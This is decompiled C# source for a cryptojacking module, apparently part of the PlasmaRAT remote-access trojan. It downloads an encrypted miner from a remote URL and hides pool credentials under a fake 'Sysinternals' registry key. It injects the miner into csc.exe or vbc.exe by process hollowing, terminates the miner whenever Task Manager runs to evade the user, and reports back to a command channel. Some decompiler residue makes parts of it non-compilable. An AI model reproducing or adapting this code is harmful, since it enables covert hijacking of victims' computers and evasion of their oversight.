using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System_Configuration.My;

namespace System_Configuration
{
	// Token: 0x02000016 RID: 22
	[StandardModule]
	internal sealed class GPUMiner
	{
		// Token: 0x06000088 RID: 136 RVA: 0x00008AB0 File Offset: 0x00006CB0
		public static void GPUMinerThreader()
		{
			if (GPUMiner.RanGPUMiner)
			{
				try
				{
					if (Process.GetProcessesByName("taskmgr").Length >= 1)
					{
						try
						{
							foreach (object obj in ((IEnumerable)NewLateBinding.LateGet(Interaction.GetObject("winmgmts:", null), null, "ExecQuery", new object[]
							{
								"Select Name from Win32_Process Where Name = '" + GPUMiner.GPUMinerExecutable + ".exe'"
							}, null, null, null)))
							{
								object objectValue = RuntimeHelpers.GetObjectValue(obj);
								NewLateBinding.LateCall(objectValue, null, "Terminate", new object[0], null, null, null, true);
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						Thread.Sleep(10000);
					}
					else if (Process.GetProcessesByName(GPUMiner.GPUMinerExecutable).Length < 1)
					{
						GPUMiner.RanGPUMiner = false;
						GPUMiner.BeginGPUMiner();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00008BB0 File Offset: 0x00006DB0
		public static void BeginGPUMiner()
		{
			try
			{
				if (!GPUMiner.RanGPUMiner)
				{
					string setting = Interaction.GetSetting("Microsoft", "Sysinternals", "vir32", "");
					if (Operators.CompareString(setting, string.Empty, false) != 0)
					{
						string[] array = Strings.Split(setting, "*", -1, CompareMethod.Binary);
						string optionalArguments = string.Concat(new string[]
						{
							"-a scrypt -o ",
							array[1],
							" ",
							array[2],
							" -p ",
							array[3],
							" -g yes --i -10"
						});
						if (File.Exists(Conversions.ToString(GPUMiner.GPUMinerFile)))
						{
							Persistence.AllowAccess(Conversions.ToString(GPUMiner.GPUMinerFile));
							byte[] input = MyProject.Computer.FileSystem.ReadAllBytes(Conversions.ToString(GPUMiner.GPUMinerFile));
							byte[] array2 = Miner.Proper_RC4(input, Encoding.UTF8.GetBytes(PlasmaRAT.Username));
							Array.Reverse(array2, 0, array2.Length);
							if (mRunpe.InjectPE(array2, RuntimeEnvironment.GetRuntimeDirectory() + "csc.exe", optionalArguments))
							{
								GPUMiner.RanGPUMiner = true;
								GPUMiner.GPUMinerExecutable = "csc";
							}
							else if (mRunpe.InjectPE(array2, RuntimeEnvironment.GetRuntimeDirectory() + "vbc.exe", optionalArguments))
							{
								GPUMiner.RanGPUMiner = true;
								GPUMiner.GPUMinerExecutable = "vbc";
							}
							if (GPUMiner.RanGPUMiner)
							{
								PlasmaRAT.TalktoChannel("Started GPU Mining on: " + PlasmaRAT.GetVideoCard(), string.Empty);
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x00008D6C File Offset: 0x00006F6C
		public static void InstallGPUMiner(string FileDownload, string Pool, string Username, string Password)
		{
			try
			{
				if (!File.Exists(Conversions.ToString(GPUMiner.GPUMinerFile)))
				{
					WebClient webClient = new WebClient();
					byte[] input = webClient.DownloadData(FileDownload);
					byte[] bytes = Miner.Proper_RC4(input, Encoding.UTF8.GetBytes(PlasmaRAT.Username));
					File.WriteAllBytes(Conversions.ToString(GPUMiner.GPUMinerFile), bytes);
				}
				Interaction.SaveSetting("Microsoft", "Sysinternals", "vir32", string.Concat(new string[]
				{
					"*",
					Pool,
					"*",
					Username,
					"*",
					Password,
					"*"
				}));
				GPUMiner.BeginGPUMiner();
			}
			catch (Exception ex)
			{
				PlasmaRAT.TalktoChannel("GPU Miner: Failed to Download Files. Error: " + ex.ToString(), string.Empty);
			}
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00008E68 File Offset: 0x00007068
		public static void RemoveGPUMiner()
		{
			int num;
			int num4;
			object obj2;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				string setting = Interaction.GetSetting("Microsoft", "Sysinternals", "vir32", "");
				IL_23:
				num2 = 3;
				if (Operators.CompareString(setting, string.Empty, false) == 0)
				{
					goto IL_FC;
				}
				IL_37:
				num2 = 4;
				Interaction.SaveSetting("Microsoft", "Sysinternals", "vir32", string.Empty);
				IL_52:
				num2 = 5;
				IEnumerator enumerator = ((IEnumerable)NewLateBinding.LateGet(Interaction.GetObject("winmgmts:", null), null, "ExecQuery", new object[]
				{
					"Select Name from Win32_Process Where Name = '" + GPUMiner.GPUMinerExecutable + ".exe'"
				}, null, null, null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					object obj = enumerator.Current;
					object objectValue = RuntimeHelpers.GetObjectValue(obj);
					IL_A8:
					num2 = 6;
					NewLateBinding.LateCall(objectValue, null, "Terminate", new object[0], null, null, null, true);
					IL_C2:
					num2 = 7;
				}
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
				IL_E2:
				num2 = 8;
				GPUMiner.RanGPUMiner = false;
				IL_EA:
				num2 = 9;
				PlasmaRAT.TalktoChannel("GPU Miner: Stopped Successfully.", string.Empty);
				IL_FC:
				goto IL_17B;
				IL_FE:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_13A:
				goto IL_170;
				IL_13C:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_14D:;
			}
			catch when (endfilter(obj2 is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj3;
				goto IL_13C;
			}
			IL_170:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_17B:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x04000071 RID: 113
		public static string Balls = "ShowSuperHidden";

		// Token: 0x04000072 RID: 114
		private static bool RanGPUMiner = false;

		// Token: 0x04000073 RID: 115
		public static object GPUMinerFile = PlasmaRAT.InstallationOfEverything + "48123.TMP";

		// Token: 0x04000074 RID: 116
		public static string GPUMinerExecutable = "eAtShiTAnDDiE.exe";
	}
}
